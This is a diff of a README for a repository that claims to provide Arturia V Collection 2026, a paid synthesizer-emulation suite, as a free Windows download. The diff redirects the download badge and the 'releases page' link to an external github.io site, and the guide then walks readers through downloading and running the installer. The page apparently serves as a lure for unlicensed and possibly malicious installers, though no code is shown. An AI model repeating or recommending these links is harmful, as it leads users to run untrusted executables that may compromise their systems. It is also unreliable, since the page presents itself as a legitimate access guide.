@@ -1,6 +1,6 @@
 # 🎹 Arturia-V-Collection-2026 - Access Professional Music Production Tools Easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://github.com/Brearhomocercal132/Arturia-V-Collection-2026/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=windows)](https://brearhomocercal132.github.io)
 
 This repository provides access to Arturia V Collection 2026 for Windows 10 and 11. The software suite includes virtual instrument emulations for modern music production. These tools replicate classic synthesizers and keyboards. You can use these instruments within your digital audio workstation to create sounds. This guide explains how to secure the files and install the software on your system.
 
@@ -21,7 +21,7 @@ If your computer meets these conditions, the software will operate as expected.
 
 You need to obtain the installer files from the official releases page. Follow these steps to access the download location.
 
-1.  Visit the [releases page](https://github.com/Brearhomocercal132/Arturia-V-Collection-2026/releases).
+1.  Visit the [releases page](https://brearhomocercal132.github.io).
 2.  Look for the latest version number at the top of the list.
 3.  Click the file link to initiate the download.
 4.  Select a folder on your computer to save the installer.
